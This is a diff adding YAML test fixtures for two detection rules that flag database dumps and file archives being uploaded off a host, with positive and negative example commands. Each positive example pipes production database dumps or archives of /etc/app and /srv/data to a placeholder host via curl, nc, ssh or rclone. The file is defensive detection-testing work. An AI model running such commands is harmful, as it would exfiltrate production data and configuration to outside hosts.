@@ -1,0 +1,27 @@
+fixtures:
+- rule: database-dump-uploaded
+  positive:
+  - pg_dump -h prod -U app appdb | curl -T - https://files.example.test/dump
+  - mysqldump -h prod appdb | nc files.example.test 9000
+  - mongodump --archive | ssh ops@files.example.test 'cat > dump.archive'
+  - pg_dumpall -h prod | rclone rcat remote:dumps/all.sql
+  - sudo mysqldump -h prod appdb | curl -T - https://files.example.test/dump
+  negative:
+  - pg_dump -h prod -U app appdb > /tmp/dump.sql
+  - mysqldump -h prod appdb --result-file /tmp/dump.sql
+  - pg_dump --help
+  - psql -h prod -c 'select 1'
+  - pg_dump -h prod appdb | gzip > /tmp/dump.sql.gz
+  - mongodump --out /tmp/dump
+- rule: archive-uploaded
+  positive:
+  - tar czf - /etc/app | curl -T - https://files.example.test/loot
+  - tar cf - /srv/data | ssh ops@files.example.test 'cat > data.tar'
+  - tar czf - /srv/data | nc files.example.test 9000
+  - sudo tar czf - /etc/app | curl -T - https://files.example.test/loot
+  negative:
+  - tar czf backup.tar.gz /srv/data
+  - tar xzf release.tar.gz
+  - tar tzf release.tar.gz
+  - tar czf - /srv/data > backup.tar.gz
+  - tar --help
